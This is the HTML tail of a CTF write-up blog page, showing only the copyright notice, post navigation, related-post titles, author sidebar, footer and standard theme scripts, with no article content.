+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">4v1d</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://daweitech.github.io/2021/09/04/buu/20/">http://daweitech.github.io/2021/09/04/buu/20/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/buu/">buu</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=null" async="async"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/09/05/php/2/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">php代码审计(三)</div></div></a></div><div class="next-post pull-right"><a href="/2021/09/03/buu/19/"><img class="next-cover" src="/imgr/6.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">MRCTF2020 Ezpop</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/07/26/buu/1/" title="强网杯 2019高明的黑客"><img class="cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-26</div><div class="title">强网杯 2019高明的黑客</div></div></a></div><div><a href="/2021/08/08/buu/10/" title="安洵杯 2019 easy_web"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-08</div><div class="title">安洵杯 2019 easy_web</div></div></a></div><div><a href="/2021/05/12/buu/0/" title="mutiple"><img class="cover" src="http://up.36992.com/pic/e6/c5/51/e6c551e768092c8655292d89a4034a74.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-12</div><div class="title">mutiple</div></div></a></div><div><a href="/2021/08/17/buu/12/" title="0CTF 2016 piapiapia"><img class="cover" src="https://gitee.com/dulily/cdn/raw/master/img/me.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-17</div><div class="title">0CTF 2016 piapiapia</div></div></a></div><div><a href="/2021/08/11/buu/11/" title="网鼎杯 2020 朱雀组 phpweb&NCTF2019 Fake XML cookbook"><img class="cover" src="https://gitee.com/dulily/cdn/raw/master/img/20201204105719.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-11</div><div class="title">网鼎杯 2020 朱雀组 phpweb&NCTF2019 Fake XML cookbook</div></div></a></div><div><a href="/2021/08/18/buu/13/" title="De1CTF 2019 SSRF Me"><img class="cover" src="https://gitee.com/dulily/cdn/raw/master/img/182205-15517813255631.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-08-18</div><div class="title">De1CTF 2019 SSRF Me</div></div></a></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/87.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">4v1d</div><div class="author-info__description">Don't cry because it is over, smile because it happened.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">79</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">18</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/daweitech"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/daweitech" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:daweitech@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">What can not give up , what also can not change.</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#Novel"><span class="toc-number">1.</span> <span class="toc-text">Novel:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GameExp"><span class="toc-number">2.</span> <span class="toc-text">GameExp:</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/10/10/nss/0/" title="suctf 2019 EasySQL"><img src="/imgr/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="suctf 2019 EasySQL"/></a><div class="content"><a class="title" href="/2021/10/10/nss/0/" title="suctf 2019 EasySQL">suctf 2019 EasySQL</a><time datetime="2021-10-10T11:36:24.000Z" title="Created 2021-10-10 19:36:24">2021-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/" title="2021鹤城杯"><img src="/imgr/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021鹤城杯"/></a><div class="content"><a class="title" href="/2021/10/10/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/" title="2021鹤城杯">2021鹤城杯</a><time datetime="2021-10-10T01:16:07.000Z" title="Created 2021-10-10 09:16:07">2021-10-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/10/04/web/2/" title="NSSCTF 2021 writeup"><img src="/imgr/0.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NSSCTF 2021 writeup"/></a><div class="content"><a class="title" href="/2021/10/04/web/2/" title="NSSCTF 2021 writeup">NSSCTF 2021 writeup</a><time datetime="2021-10-04T02:36:35.000Z" title="Created 2021-10-04 10:36:35">2021-10-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/29/buu/25/" title="极客大挑战 2019 RCE ME"><img src="/imgr/16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="极客大挑战 2019 RCE ME"/></a><div class="content"><a class="title" href="/2021/09/29/buu/25/" title="极客大挑战 2019 RCE ME">极客大挑战 2019 RCE ME</a><time datetime="2021-09-29T13:28:21.000Z" title="Created 2021-09-29 21:28:21">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/28/buu/24/" title="MRCTF2020 wirteup"><img src="/imgr/11.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="MRCTF2020 wirteup"/></a><div class="content"><a class="title" href="/2021/09/28/buu/24/" title="MRCTF2020 wirteup">MRCTF2020 wirteup</a><time datetime="2021-09-28T11:31:00.000Z" title="Created 2021-09-28 19:31:00">2021-09-28</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 4v1d</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
